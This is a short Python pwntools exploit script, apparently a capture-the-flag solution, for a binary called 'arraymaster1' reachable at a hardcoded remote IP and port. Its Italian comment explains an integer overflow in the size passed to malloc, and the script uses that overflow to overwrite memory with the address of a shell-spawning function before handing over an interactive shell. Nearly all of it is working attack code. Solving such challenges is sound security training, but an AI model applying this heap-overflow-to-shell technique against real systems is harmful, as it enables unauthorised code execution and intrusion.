#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('arraymaster1')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("149.202.200.158", 6005, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

#break at getline()
gdbscript = '''
tbreak main
br *0x400df4
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

io = start()

spawn_sh_addr = 0x004009c3
#Idea: l'operazione length*(type>>3) permette di mandare in overflow l'argomento della malloc
#ma non il contenuto di length => si puo' usare set su un area non mallocata dalla struct
#done

io.sendline("init A 64 2305843009213693952")
io.sendline("init B 64 10")
io.sendline("set A 8 %d" % spawn_sh_addr)
io.sendline("set B 5 10")
#io.sendline("init 0 8 4294967296")
#io.sendline("set A 18446744073709551619 %d" % spawn_sh_addr)
#io.sendline("init A 8 18446744073709551615")
#io.sendline("delete A")
#io.sendline("init B 32 0")
#io.sendline("init B 64 0")
#io.sendline("init A 64 5")
#io.sendline("get B 64 5")

io.interactive()

